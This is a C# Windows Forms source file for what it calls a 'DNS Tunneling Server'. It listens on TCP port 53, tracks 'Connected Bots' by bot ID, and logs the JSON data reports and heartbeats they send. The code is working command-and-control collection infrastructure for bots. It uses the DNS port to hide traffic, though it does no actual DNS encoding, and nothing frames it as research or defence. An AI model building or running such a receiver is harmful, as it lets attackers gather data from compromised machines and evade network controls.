using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Server
{
    public partial class Form1 : Form
    {
        private TcpListener? tcpListener;
        private Thread? listenerThread;
        private bool isRunning = false;
        private List<ClientInfo> connectedClients = new List<ClientInfo>();
        private object clientsLock = new object();

        public Form1()
        {
            InitializeComponent();
            InitializeCustomComponents();
        }

        private void InitializeCustomComponents()
        {
            this.Text = "DNS Tunneling Server - Port 53 Manager";
            this.Size = new Size(1000, 700);
            this.StartPosition = FormStartPosition.CenterScreen;

            // Status Panel
            Panel statusPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 80,
                BorderStyle = BorderStyle.FixedSingle
            };

            Label lblStatus = new Label
            {
                Text = "Server Status:",
                Location = new Point(10, 10),
                AutoSize = true,
                Font = new Font("Arial", 10, FontStyle.Bold)
            };

            Label lblServerStatus = new Label
            {
                Name = "lblServerStatus",
                Text = "Stopped",
                Location = new Point(120, 10),
                AutoSize = true,
                ForeColor = Color.Red,
                Font = new Font("Arial", 10, FontStyle.Bold)
            };

            Button btnStart = new Button
            {
                Name = "btnStart",
                Text = "Start Server",
                Location = new Point(10, 40),
                Size = new Size(120, 30),
                BackColor = Color.Green,
                ForeColor = Color.White
            };
            btnStart.Click += BtnStart_Click;

            Button btnStop = new Button
            {
                Name = "btnStop",
                Text = "Stop Server",
                Location = new Point(140, 40),
                Size = new Size(120, 30),
                BackColor = Color.Red,
                ForeColor = Color.White,
                Enabled = false
            };
            btnStop.Click += BtnStop_Click;

            Button btnClearLogs = new Button
            {
                Name = "btnClearLogs",
                Text = "Clear Logs",
                Location = new Point(270, 40),
                Size = new Size(120, 30)
            };
            btnClearLogs.Click += BtnClearLogs_Click;

            Label lblConnected = new Label
            {
                Name = "lblConnected",
                Text = "Connected Clients: 0",
                Location = new Point(400, 45),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };

            statusPanel.Controls.AddRange(new Control[] { lblStatus, lblServerStatus, btnStart, btnStop, btnClearLogs, lblConnected });
            this.Controls.Add(statusPanel);

            // Clients ListBox
            Label lblClients = new Label
            {
                Text = "Connected Bots:",
                Location = new Point(10, 90),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            this.Controls.Add(lblClients);

            ListBox lstClients = new ListBox
            {
                Name = "lstClients",
                Location = new Point(10, 115),
                Size = new Size(250, 500),
                Font = new Font("Consolas", 9)
            };
            this.Controls.Add(lstClients);

            // Data Display
            Label lblData = new Label
            {
                Text = "Received Data (JSON Format):",
                Location = new Point(270, 90),
                AutoSize = true,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            this.Controls.Add(lblData);

            RichTextBox txtData = new RichTextBox
            {
                Name = "txtData",
                Location = new Point(270, 115),
                Size = new Size(700, 500),
                Font = new Font("Consolas", 9),
                ReadOnly = true,
                BackColor = Color.Black,
                ForeColor = Color.LimeGreen
            };
            this.Controls.Add(txtData);
        }

        private void BtnStart_Click(object? sender, EventArgs e)
        {
            StartServer();
        }

        private void BtnStop_Click(object? sender, EventArgs e)
        {
            StopServer();
        }

        private void BtnClearLogs_Click(object? sender, EventArgs e)
        {
            if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
            {
                txtData.Clear();
            }
        }

        private void StartServer()
        {
            try
            {
                isRunning = true;
                tcpListener = new TcpListener(IPAddress.Any, 53);
                tcpListener.Start();

                listenerThread = new Thread(ListenForClients);
                listenerThread.IsBackground = true;
                listenerThread.Start();

                UpdateUI(() =>
                {
                    if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
                    {
                        lblStatus.Text = "Running on Port 53";
                        lblStatus.ForeColor = Color.Green;
                    }

                    if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
                        btnStart.Enabled = false;

                    if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
                        btnStop.Enabled = true;
                });

                LogMessage("Server started on port 53 (DNS Tunnel Mode)", Color.Cyan);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start server: {ex.Message}\n\nNote: Port 53 requires Administrator privileges.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void StopServer()
        {
            isRunning = false;
            tcpListener?.Stop();

            UpdateUI(() =>
            {
                if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
                {
                    lblStatus.Text = "Stopped";
                    lblStatus.ForeColor = Color.Red;
                }

                if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
                    btnStart.Enabled = true;

                if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
                    btnStop.Enabled = false;
            });

            LogMessage("Server stopped", Color.Yellow);
        }

        private void ListenForClients()
        {
            while (isRunning)
            {
                try
                {
                    if (tcpListener!.Pending())
                    {
                        TcpClient client = tcpListener.AcceptTcpClient();
                        Thread clientThread = new Thread(() => HandleClient(client));
                        clientThread.IsBackground = true;
                        clientThread.Start();
                    }
                    Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    if (isRunning)
                    {
                        LogMessage($"Error accepting client: {ex.Message}", Color.Red);
                    }
                }
            }
        }

        private void HandleClient(TcpClient client)
        {
            string clientId = "";
            try
            {
                NetworkStream stream = client.GetStream();
                byte[] buffer = new byte[4096];

                LogMessage($"New client connected: {client.Client.RemoteEndPoint}", Color.Yellow);

                while (isRunning && client.Connected)
                {
                    if (stream.DataAvailable)
                    {
                        // Read 4-byte length header
                        byte[] lengthBuffer = new byte[4];
                        int bytesRead = stream.Read(lengthBuffer, 0, 4);
                        if (bytesRead != 4) break;

                        int length = BitConverter.ToInt32(lengthBuffer, 0);
                        if (length <= 0 || length > 1048576) break; // Max 1MB

                        // Read JSON data
                        byte[] dataBuffer = new byte[length];
                        int totalRead = 0;
                        while (totalRead < length)
                        {
                            bytesRead = stream.Read(dataBuffer, totalRead, length - totalRead);
                            if (bytesRead == 0) break;
                            totalRead += bytesRead;
                        }

                        if (totalRead == length)
                        {
                            string jsonData = Encoding.UTF8.GetString(dataBuffer);
                            ProcessReceivedData(jsonData, ref clientId);
                        }
                    }
                    Thread.Sleep(50);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Client error: {ex.Message}", Color.Red);
            }
            finally
            {
                client.Close();
                RemoveClient(clientId);
                LogMessage($"Client disconnected: {clientId}", Color.Yellow);
            }
        }

        private void ProcessReceivedData(string jsonData, ref string clientId)
        {
            try
            {
                using JsonDocument doc = JsonDocument.Parse(jsonData);
                JsonElement root = doc.RootElement;

                string botId = root.GetProperty("bot_id").GetString() ?? "Unknown";
                string timestamp = root.GetProperty("timestamp").GetString() ?? "";
                string messageType = root.GetProperty("message_type").GetString() ?? "";
                
                if (string.IsNullOrEmpty(clientId))
                {
                    clientId = botId;
                    AddClient(botId);
                }

                JsonElement payload = root.GetProperty("payload");
                string payloadType = payload.GetProperty("type").GetString() ?? "";
                string content = payload.GetProperty("content").GetString() ?? "";

                // Format output
                string formattedJson = $"[{timestamp}] {botId} - {messageType}\n" +
                                     $"Type: {payloadType}\n" +
                                     $"Content: {content}\n" +
                                     $"Raw JSON: {jsonData}\n" +
                                     new string('-', 80) + "\n";

                Color color = messageType switch
                {
                    "DATA_REPORT" => Color.LimeGreen,
                    "HEARTBEAT" => Color.Cyan,
                    _ => Color.White
                };

                LogMessage(formattedJson, color);
            }
            catch (Exception ex)
            {
                LogMessage($"Error parsing JSON: {ex.Message}\nData: {jsonData}", Color.Red);
            }
        }

        private void AddClient(string clientId)
        {
            lock (clientsLock)
            {
                if (!connectedClients.Any(c => c.BotId == clientId))
                {
                    connectedClients.Add(new ClientInfo
                    {
                        BotId = clientId,
                        ConnectedAt = DateTime.Now
                    });

                    UpdateUI(() =>
                    {
                        if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
                        {
                            lstClients.Items.Add($"{clientId} - {DateTime.Now:HH:mm:ss}");
                        }

                        if (this.Controls.Find("lblConnected", true).FirstOrDefault() is Label lblConnected)
                        {
                            lblConnected.Text = $"Connected Clients: {connectedClients.Count}";
                        }
                    });
                }
            }
        }

        private void RemoveClient(string clientId)
        {
            lock (clientsLock)
            {
                connectedClients.RemoveAll(c => c.BotId == clientId);

                UpdateUI(() =>
                {
                    if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
                    {
                        for (int i = lstClients.Items.Count - 1; i >= 0; i--)
                        {
                            if (lstClients.Items[i].ToString()?.StartsWith(clientId) == true)
                            {
                                lstClients.Items.RemoveAt(i);
                            }
                        }
                    }

                    if (this.Controls.Find("lblConnected", true).FirstOrDefault() is Label lblConnected)
                    {
                        lblConnected.Text = $"Connected Clients: {connectedClients.Count}";
                    }
                });
            }
        }

        private void LogMessage(string message, Color color)
        {
            UpdateUI(() =>
            {
                if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
                {
                    txtData.SelectionStart = txtData.TextLength;
                    txtData.SelectionLength = 0;
                    txtData.SelectionColor = color;
                    txtData.AppendText(message + "\n");
                    txtData.ScrollToCaret();
                }
            });
        }

        private void UpdateUI(Action action)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(action);
            }
            else
            {
                action();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopServer();
            base.OnFormClosing(e);
        }
    }

    public class ClientInfo
    {
        public string BotId { get; set; } = "";
        public DateTime ConnectedAt { get; set; }
    }
}
